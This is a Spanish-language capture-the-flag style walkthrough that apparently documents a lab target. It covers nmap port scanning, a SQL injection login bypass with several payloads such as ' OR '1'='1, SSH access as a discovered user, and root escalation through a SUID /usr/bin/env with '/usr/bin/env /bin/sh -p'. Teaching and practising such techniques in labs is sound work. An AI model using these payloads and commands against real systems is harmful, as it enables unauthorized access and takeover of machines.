## 1. Reconocimiento de Puertos con Nmap
Usamos `nmap` para detectar puertos abiertos y versiones de servicios:

```bash
sudo nmap <IP_DEL_OBJETIVO>
nmap -sV -p 22,80 <IP_DEL_OBJETIVO>
```

Servicios Identificados:

| PUERTO | SERVICIO | VERSIÓN             |
| ------ | -------- | ------------------- |
| 22/tcp | ssh      | OpenSSH 8.9p1       |
| 80/tcp | http     | Apache httpd 2.4.52 |

Esto nos indica que hay un servidor SSH y una aplicación web Apache, siendo esta última el probable punto de entrada para la inyección.
## 2. Explotación: Inyección SQL

Accedemos a la aplicación web en el puerto 80, que presenta un formulario de inicio de sesión.
### 2.1. Detección de Inyección SQL
Para verificar si la aplicación es vulnerable a inyección SQL, introducimos una comilla simple (`‘`) en el campo de contraseña:

*   **Usuario:** `user`
*   **Contraseña:** `‘`

Si la aplicación es vulnerable, un mensaje de error de sintaxis SQL confirmará la vulnerabilidad y el tipo de base de datos (ej. MariaDB):

```
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

### 2.2. Bypass de Autenticación

Con la vulnerabilidad confirmada, podemos usar un payload para saltar la autenticación. El payload `‘ OR ‘1’=’1` manipula la consulta SQL para que siempre sea verdadera.

*   **Usuario:** `cualquier cosa`
*   **Contraseña:** ‘ OR ‘1’=’1

Tambien funciona:

User:' OR '1'='1'-- Pasword: cualquier cosa
User:' OR '1'='1'# Pasword: cualquier cosa
User:admin’ or 1=1— - Pasword: cualquier cosa

**Cómo funciona:**
La consulta original (ej. `SELECT * FROM users WHERE username = 'user' AND password = 'pass';`) se transforma en:

```sql
SELECT * FROM users WHERE username = 'cualquier cosa' AND password = '' OR '1'='1';
```

Dado que `‘1’='1'` es siempre verdadero, la condición `OR` hace que toda la cláusula `WHERE` sea verdadera, permitiendo el acceso. Otras variaciones como `‘ OR ‘1’='1'--` o `admin’ or 1=1— -` también funcionan.
## 3. Acceso Inicial vía SSH

Una vez obtenido un nombre de usuario (ej. "Dylan") a través del bypass de autenticación, intentamos acceder al sistema vía SSH:

```bash
ssh dylan@< IP_DEL_OBJETIVO >
```

El comando `whoami` confirmará el usuario actual.
## 4. Escalada de Privilegios
El objetivo es obtener privilegios de `root` buscando configuraciones erróneas.
### 4.1. Búsqueda de Binarios SUID

Buscamos archivos con el bit SUID habilitado que pertenecen a `root`. Estos archivos se ejecutan con los permisos de su propietario, lo que puede ser explotado.

```bash
find / -perm -4000 -user root 2>/dev/null
```

**salida**
```bash
/usr/lib/openssh/ssh-keysign 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/bin/mount 
/usr/bin/gpasswd 
/usr/bin/chfn 
/usr/bin/env ← 
/usr/bin/su
/usr/bin/newgrp 
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
```
Un binario común para explotar es `/usr/bin/env`.
### 4.2. Explotación de `env` (GTFOBins)

Consultamos [GTFOBins](https://gtfobins.github.io/) para encontrar cómo explotar `env`. La técnica es ejecutar `env` con un shell y el flag `-p` para mantener los privilegios de `root`:

```bash
/usr/bin/env /bin/sh -p
```

El flag `-p` asegura que el shell (`/bin/sh`) se ejecute con los permisos del propietario de `env` (que es `root`).

`whoami` muestra `root`.
